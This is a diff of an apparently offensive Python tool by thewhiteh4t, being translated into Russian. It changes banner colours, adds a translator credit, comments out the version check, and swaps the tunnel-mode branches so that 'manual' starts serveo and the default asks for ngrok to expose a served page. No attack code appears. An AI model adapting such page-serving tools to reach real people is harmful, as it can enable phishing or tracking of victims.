@@ -5,6 +5,7 @@ R = '\033[31m' # red
 G = '\033[32m' # green
 C = '\033[36m' # cyan
 W = '\033[0m'  # white
+B = '\033[34m' # blue
 
 from shutil import which
 
@@ -50,7 +51,7 @@ result = ''
 version = '1.2.5'
 
 def banner():
-	print (G +
+	print (B +
 	r'''
                         __
   ______  ____   ____  |  | __  ____ _______
@@ -59,6 +60,7 @@ def banner():
 /____  > \___  >\___  >|__|_ \ \___  >|__|
 	 \/      \/     \/      \/     \/        ''' + W)
 	print('\n' + G + '[>]' + C + ' Создан : ' + W + 'thewhiteh4t')
+	print(G + '[>]' + B + ' Улучшен и переведен : ' + W + 'artem213101zse')
 	print(G + '[>]' + C + ' Версия    : ' + W + version + '\n')
 
 def ver_check():
@@ -81,10 +83,10 @@ def ver_check():
 		print('\n' + R + '[-]' + C + ' Исключение : ' + W + str(e))
 
 def tunnel_select():
-	if tunnel_mode == None:
+	if tunnel_mode == 'manual':
 		serveo()
-	elif tunnel_mode == 'manual':
-		print(G + '[+]' + C + ' Пропускаю Serveo, запустите свой собственный туннельный сервис вручную...' + W + '\n')
+	elif tunnel_mode == None:
+		print(G + '[+]' + C + 'Необходимо запустить ngrok для отправки страницы в интернет' + W + '\n')
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
@@ -362,7 +364,7 @@ def Quit():
 
 try:
 	banner()
-	ver_check()
+	#ver_check()
 	tunnel_select()
 	template_select()
 	server()
